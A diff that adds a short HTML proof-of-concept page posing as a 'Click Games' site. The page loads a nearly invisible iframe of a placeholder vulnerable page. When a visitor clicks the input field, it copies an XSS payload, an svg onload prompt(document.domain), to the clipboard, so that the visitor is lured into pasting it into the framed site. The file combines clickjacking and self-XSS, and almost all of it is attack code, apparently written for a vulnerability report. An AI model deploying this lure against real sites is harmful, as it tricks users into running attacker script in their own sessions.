@@ -1,0 +1,22 @@
+<html>
+<head><title>Poc</title></head>
+<body>
+<h1>Welcome to Click Games</h1>
+Message :<input id="copy-text" type="text" value='"/><svg/onload=prompt(document.domain)>"'>
+<br><br><br>
+<script>document.getElementById("copy-text").onclick = function(){
+this.select();
+document.execCommand('copy');
+alert("You'r Game Begins!")
+}
+</script><style>
+iframe {
+width: 600px;
+height: 450px;
+position: absolute;
+top: 0; right: 10;
+filter: alpha(opacity=50);
+opacity: 0.1;
+}
+</style><iframe src="https://vulnerable_page"></iframe></body>
+</html>
